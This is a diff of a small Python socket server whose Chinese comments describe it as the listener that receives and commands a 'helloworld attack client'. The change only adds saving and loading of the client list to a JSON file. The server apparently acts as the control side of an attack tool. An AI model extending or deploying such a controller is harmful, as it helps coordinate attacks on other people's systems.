@@ -1,9 +1,24 @@
 import time
 import socket
 # 用于接应helloworld攻击客户端的服务模块
+import json
 
+def write(data):
+	with open("data.json",'w') as ojbk:
+		json.dump(data,ojbk)  
+
+def read():
+	with open("data.json") as zx:
+		data = json.load(zx)
+	return data
 
 def main():
+	user_list = {}
+	try:
+		user_list = read()
+	except:
+		pass
+
 	host = ""
 	port = 2233
 	sock = socket.socket()
@@ -11,7 +26,6 @@ def main():
 	sock.listen(5)
 
 	print("攻击监听服务启动！")
-	user_list = {}
 
 	while True:
 
@@ -33,7 +47,10 @@ def main():
 
 			cli.sendall("stop".encode())
 
+		print(user_list)
+		write(user_list)
 
+main()
 
 
 
